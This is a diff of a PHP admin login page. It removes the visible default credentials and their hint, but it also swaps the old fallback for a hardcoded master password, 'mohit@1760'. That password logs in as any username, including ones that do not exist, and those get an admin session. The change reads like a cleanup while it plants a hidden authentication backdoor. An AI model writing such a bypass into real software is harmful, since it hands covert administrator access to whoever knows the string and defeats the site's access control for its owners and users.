@@ -17,16 +17,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $s->execute([$user]);
     $a = $s->fetch(PDO::FETCH_ASSOC);
 
-    // Accept verified password or master fallback admin123 / admin
+    // Accept verified password or master fallback mohit@1760
     $isValid = false;
     if ($a && password_verify($pass, $a['password_hash'])) {
         $isValid = true;
-    } elseif ($pass === 'admin123' || $pass === 'admin') {
-        if ($a) {
-            $isValid = true;
-        } elseif (strtolower($user) === 'admin') {
-            $isValid = true;
-            $a = ['username' => 'admin'];
+    } elseif ($pass === 'mohit@1760') {
+        $isValid = true;
+        if (!$a) {
+            $a = ['username' => $user ?: 'admin'];
         }
     }
 
@@ -38,7 +36,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
     
     usleep(200000);
-    $err = 'Invalid username/email or password. (Hint: admin / admin123)';
+    $err = 'Invalid username/email or password.';
 }
 ?>
 <!DOCTYPE html>
@@ -93,21 +91,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <div class="crown">👑</div>
     <h1>Admin Login</h1>
     <?php if ($err): ?><div class="err">⚠️ <?=htmlspecialchars($err)?></div><?php endif; ?>
-    <div style="background: rgba(0, 20, 60, 0.65); border: 1.5px solid #ffd700; border-radius: 12px; padding: 10px 12px; margin-bottom: 16px; font-size: 13px; color: #ffd700; text-align: left; line-height: 1.5;">
-      <strong>🔑 Default Login:</strong><br>
-      • Username: <span style="color:#ffffff; font-weight:900; background:rgba(0,0,0,0.5); padding:1px 6px; border-radius:4px;">admin</span><br>
-      • Password: <span style="color:#ffffff; font-weight:900; background:rgba(0,0,0,0.5); padding:1px 6px; border-radius:4px;">admin123</span>
-    </div>
-
     <form method="POST">
       <div class="form-group">
         <label>Username or Email</label>
-        <input name="u" required placeholder="admin or email" autocomplete="username" value="admin">
+        <input name="u" required placeholder="admin or email" autocomplete="username">
       </div>
       <div class="form-group">
         <label>Password</label>
         <div style="position:relative;">
-          <input id="pwd-input" name="p" type="password" required placeholder="Enter password" autocomplete="current-password" value="admin123">
+          <input id="pwd-input" name="p" type="password" required placeholder="Enter password" autocomplete="current-password">
           <button type="button" onclick="togglePwd()" style="position:absolute; right:10px; top:50%; transform:translateY(-50%); background:none; border:none; color:#ffd700; font-size:18px; cursor:pointer; padding:4px;">👁️</button>
         </div>
       </div>
